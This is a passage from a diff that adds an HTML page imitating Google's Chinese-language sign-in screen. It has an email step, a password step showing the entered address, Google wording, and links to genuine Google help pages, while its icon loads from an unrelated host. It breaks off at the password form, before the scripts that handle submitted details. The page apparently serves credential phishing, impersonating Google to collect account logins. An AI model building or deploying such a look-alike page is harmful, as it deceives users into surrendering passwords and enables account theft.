@@ -1,0 +1,1021 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="https://static.mocortech.com/image-host/web/favicon/favicon.ico" type="image/x-icon">
+  <style>
+    /* --- Loading Animation Styles --- */
+    .loader {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 3px;
+      background-color: rgba(26, 115, 232, 0.2);
+      overflow: hidden;
+      z-index: 10;
+      display: none;
+    }
+    .loader-inner {
+      width: 35%;
+      height: 100%;
+      background-color: #1a73e8;
+      position: absolute;
+      top: 0;
+      left: 0;
+      animation: indeterminate-progress 1.5s infinite linear;
+    }
+    @keyframes indeterminate-progress {
+      0% { left: -40%; }
+      100% { left: 100%; }
+    }
+    /* --- End Loading Animation Styles --- */
+
+    /* --- Original Styles --- */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px 0;
+    }
+    .container {
+      background: #ffffff;
+      padding: 48px 40px;
+      border-radius: 28px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      display: flex;
+      width: auto;
+      height: auto;
+      max-width: 840px;
+      max-height: 445px;
+      margin-left: 200px;
+      margin-right: 200px;
+      overflow: hidden;
+      position: relative;
+    }
+    .left {
+      flex: 1;
+      padding-right: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      align-items: flex-start;
+    }
+    .right {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      padding-left: 40px;
+    }
+    #login-section .right {
+      padding-top: 68px;
+    }
+    #password-section .right {
+      padding-top: 114px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 2.25rem;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 10px;
+    }
+    .subtitle {
+      font-size: 0.875rem;
+      color: #202124;
+      margin-bottom: 32px;
+    }
+    .form-wrapper {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      flex-grow: 1;
+    }
+    #login-form, #password-form {
+      display: flex;
+      flex-direction: column;
+      flex-grow: 1;
+    }
+    .input-container {
+      position: relative;
+      margin-bottom: 16px;
+    }
+    .input-container input {
+      width: 100%;
+      min-width: 0%;
+      padding: 16px 12px;
+      font-size: 16px;
+      border: 1px solid #000000;
+      border-radius: 4px;
+      outline: none;
+    }
+    .input-container input:focus {
+      border: 2px solid #1a73e8;
+      padding: 15px 11px;
+    }
+    .input-container label {
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+      color: #5f6368;
+      font-size: 16px;
+      pointer-events: none;
+      transition: all 0.2s ease;
+      background-color: white;
+      padding: 0 4px;
+    }
+    .input-container input:focus + label,
+    .input-container input:not(:placeholder-shown) + label {
+      top: 0;
+      transform: translateY(-50%) scale(0.75);
+      color: #1a73e8;
+      margin-left: -15px;
+    }
+    .hint {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+    .hint span{
+      color: #5f6368;
+    }
+    .hint a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .link {
+      font-size: 14px;
+      color: #1a73e8;
+      text-decoration: none;
+      display: inline-block;
+      margin-bottom: 24px;
+      font-weight: 500;
+    }
+    .button-area {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      gap: 16px;
+      width: 100%;
+      margin-top: auto;
+      padding-top: 32px;
+    }
+    .btn-create {
+      background: none;
+      border: none;
+      color: #1a73e8;
+      font-size: 14px;
+      height: 40px;
+      width: auto;
+      min-width: 110px;
+      font-weight: 500;
+      padding: 8px 12px;
+      border-radius: 24px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      white-space: nowrap;
+    }
+    .btn-create:hover {
+      background-color: rgba(26, 115, 232, 0.04);
+    }
+    .btn-next {
+      background-color: #1a73e8;
+      color: white;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      border: none;
+      border-radius: 24px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      white-space: nowrap;
+    }
+    .btn-next:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    .checkbox-container input {
+      margin-right: 8px;
+      width: 18px;
+      height: 18px;
+      cursor: pointer;
+    }
+    .checkbox-container label {
+      cursor: pointer;
+      color: black;
+    }
+    .bottom-area {
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+      max-width: 750px;
+      margin-top: 24px;
+      padding: 0 8px;
+    }
+    .bottom-area .language-group, .bottom-area {
+      display: flex;
+      align-items: center;
+      margin-left: -30px;
+    }
+    .bottom-area {
+      justify-content: space-between;
+    }
+    .bottom-area .language-group { }
+    .links-group {
+      display: flex;
+      align-items: center;
+      margin-right: -50px;
+    }
+    .bottom-area a {
+      font-size: 12px;
+      color: #000000;
+      text-decoration: none;
+      margin: 0 8px;
+      white-space: nowrap;
+    }
+    .language-selector {
+      position: relative;
+    }
+    /* --- Custom Language Selector Styles START --- */
+    .custom-language-selector {
+      position: relative;
+      width: auto;
+      min-width: 150px;
+      font-size: 12px;
+      user-select: none;
+    }
+    .selected-language {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 7px 12px;
+      border: 1px solid transparent;
+      border-radius: 4px;
+      cursor: pointer;
+      background-color: #ffffff;
+      transition: background-color 0.2s, border-color 0.2s, box-shadow 0.2s;
+      height: 30px;
+    }
+    .selected-language:hover,
+    .custom-language-selector.open .selected-language {
+      background-color: #f8f9fa;
+      border-color: #c1c5c8;
+    }
+    .selected-language:focus-visible {
+      outline: none;
+      background-color: #ffffff;
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.3);
+    }
+    #selected-lang-text {
+      color: #3c4043;
+      flex-grow: 1;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      padding-right: 5px;
+    }
+    .dropdown-arrow {
+      fill: #5f6368;
+      transition: transform 0.2s ease-in-out;
+      margin-left: 8px;
+      width: 16px;
+      height: 16px;
+      flex-shrink: 0;
+    }
+    .custom-language-selector.open .dropdown-arrow {
+      transform: rotate(180deg);
+    }
+    .language-options {
+      list-style: none;
+      padding: 8px 0;
+      margin: 0;
+      position: absolute;
+      bottom: calc(100% + 4px);
+      left: 0;
+      min-width: 100%;
+      width: max-content;
+      max-width: 280px;
+      background-color: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15), 0 0 0 1px rgba(0,0,0,0.05);
+      z-index: 100;
+      display: none;
+      max-height: 220px;
+      overflow-y: auto;
+      border: 1px solid #dadce0;
+    }
+    .custom-language-selector.open .language-options {
+      display: block;
+    }
+    .language-options li {
+      padding: 8px 16px;
+      color: #202124;
+      cursor: pointer;
+      transition: background-color 0.1s;
+      white-space: nowrap;
+      font-size: 13px;
+    }
+    .language-options li:hover {
+      background-color: #f1f3f4;
+    }
+    .language-options li.selected {
+      background-color: #e8f0fe;
+      color: #174ea6;
+      font-weight: 500;
+    }
+    .language-options li:focus-visible {
+      outline: none;
+      background-color: #e0e0e0;
+    }
+    .language-options::-webkit-scrollbar { width: 6px; }
+    .language-options::-webkit-scrollbar-track { background: transparent; }
+    .language-options::-webkit-scrollbar-thumb { background: #dadce0; border-radius: 3px; }
+    .language-options::-webkit-scrollbar-thumb:hover { background: #c1c5c8; }
+    /* --- Custom Language Selector Styles END --- */
+
+    .user-display {
+      width: auto;
+      height: auto;
+      display: flex;
+      align-items: center;
+      padding: 2px 5px;
+      border: 1px solid black;
+      border-radius: 16px;
+      margin-bottom: 32px;
+      width: fit-content;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    .user-display:hover {
+      background-color: #f1f3f4;
+    }
+    .user-display .avatar {
+      width: 30px;
+      height: 30px;
+      background-color: #ffffff;
+      border-radius: 50%;
+      margin-right: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      flex-shrink: 0;
+    }
+    .user-display .avatar svg {
+      width: 24px;
+      height: 24px;
+    }
+    .user-display .email {
+      font-size: 0.875rem;
+      color: #3c4043;
+      margin-right: 8px;
+      font-weight: 500;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .user-display .dropdown {
+      margin-left: auto;
+      padding-left: 4px;
+      line-height: 0;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .user-display .dropdown svg {
+      display: block;
+    }
+    .welcome-text {
+      margin-bottom: 10px;
+    }
+    #login-section, #password-section {
+      display: flex;
+      width: 100%;
+    }
+    #password-section {
+      display: none;
+    }
+    .error-message {
+      color: red;
+      margin-bottom: 10px;
+      min-height: 1.2em;
+      font-size: 0.875rem;
+    }
+    .info-message {
+      color: #202124;
+      margin-bottom: 10px;
+      min-height: 1.2em;
+      font-size: 0.875rem;
+      line-height: 1.4;
+    }
+
+    /* ✨ 关键修改 2: 添加媒体查询以实现移动端适配 */
+    @media (max-width: 768px) {
+      body {
+        padding: 0; /* 移除 body 的内边距，让容器贴近边缘 */
+        justify-content: flex-start; /* 内容从顶部开始 */
+      }
+      .container {
+        flex-direction: column; /* 垂直堆叠左右部分 */
+        width: 100%;
+        max-width: 100%;
+        height: 100%;
+        min-height: 100vh; /* 确保容器至少和视口一样高 */
+        margin: 0; /* 移除外边距 */
+        padding: 24px; /* 调整内边距 */
+        border-radius: 0; /* 移除圆角 */
+        box-shadow: none; /* 移除阴影 */
+      }
+      #login-section, #password-section {
+        flex-direction: column; /* 确认垂直布局 */
+      }
+      .left, .right {
+        padding: 0; /* 移除左右区域的内边距 */
+        align-items: center; /* 居中对齐内容 */
+        text-align: center; /* 文本居中 */
+      }
+      #login-section .right,
+      #password-section .right {
+        padding-top: 20px; /* 减小右侧区域的上边距 */
+      }
+      .left {
+          align-items: center; /* 左侧内容也居中 */
+      }
+      h1 {
+        font-size: 1.75rem; /* 减小标题字号 */
+      }
+      .hint {
+        text-align: left; /* 提示信息保持左对齐 */
+      }
+      .button-area {
+        flex-direction: column-reverse; /* 垂直堆叠按钮，"下一步"在下方 */
+        align-items: stretch; /* 拉伸按钮以填充宽度 */
+        gap: 12px; /* 调整按钮间距 */
+        padding-top: 24px;
+      }
+      .btn-next {
+        width: 100%; /* 按钮宽度为100% */
+      }
+      .btn-create {
+        width: 100%;
+        background-color: transparent; /* 确保创建按钮背景在移动端也清晰 */
+      }
+      .bottom-area {
+        flex-direction: column; /* 垂直布局 */
+        align-items: center; /* 居中对齐 */
+        margin: 24px auto; /* 调整外边距 */
+        padding: 0 16px;
+        gap: 20px; /* 增加组之间的间距 */
+        width: 100%;
+      }
+      .bottom-area .language-group, .links-group {
+        margin: 0; /* 移除负边距 */
+        justify-content: center; /* 内部项居中 */
+      }
+      .language-options {
+        bottom: auto; /* 调整下拉菜单位置 */
+        top: calc(100% + 4px);
+        left: 50%; /* 居中显示 */
+        transform: translateX(-50%); /* 精确居中 */
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container" id="login-section">
+    <div class="loader" id="loader">
+      <div class="loader-inner"></div>
+    </div>
+
+    <div class="left">
+      <div class="logo">
+        <img src="data:image/png;base64,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" alt="logo" width="180" height="80"/>
+      </div>
+      <h1 data-translate-key="signIn">登录</h1>
+      <div class="subtitle" data-translate-key="useYourGoogleAccount">使用您的 Google 帐号</div>
+    </div>
+
+    <div class="right">
+      <div class="form-wrapper">
+        <form id="login-form" onsubmit="handleUsername(event)">
+          <div id="username-error" class="error-message"></div>
+          <div class="input-container">
+            <input type="text" id="username" name="username" required placeholder=" " autocomplete="username" />
+            <label for="username" data-translate-key="emailOrPhoneLabel">电子邮件地址或电话号码</label>
+          </div>
+          <a class="link" href="https://accounts.google.com/signin/v2/usernamerecovery" data-translate-key="forgotEmail">忘记了电子邮件地址？</a>
+          <div class="hint">
+            <span data-translate-key="guestModeHintPart1">您用的不是自己的电脑？请使用访客模式无痕登录。</span>
+            <a href="https://support.google.com/chrome/answer/6130773" data-translate-key="learnMoreGuest">详细了解如何使用访客模式</a>
+          </div>
+          <div class="button-area">
+            <button type="button" class="btn-create" onclick="window.location.href='https://accounts.google.com/v3/signin/challenge/wa'" data-translate-key="createAccount">创建账号</button>
+            <button type="submit" class="btn-next" data-translate-key="next">下一步</button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <div class="container" id="password-section">
+    <div class="loader" id="loader-password" style="display: none;"> <div class="loader-inner"></div>
+    </div>
+
+    <div class="left">
+      <div class="logo">
+        <img src="data:image/png;base64,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" alt="logo" width="180" height="80"/>
+      </div>
+      <h1 class="welcome-text" data-translate-key="welcome">欢迎</h1>
+      <div class="user-display" onclick="backToLogin()" title="切换帐号" data-translate-key-title="switchAccountTitle">
+        <div class="avatar">
+          <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
+        </div>
+        <span class="email" id="displayed-email">user@gmail.com</span>
+        <span class="dropdown">
+          <svg aria-hidden="true" class="Qk3oof u4TTuf" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"></path></svg>
+        </span>
+      </div>
+    </div>
+
+    <div class="right">
+      <div class="form-wrapper">
+        <form id="password-form" onsubmit="handlePassword(event)">
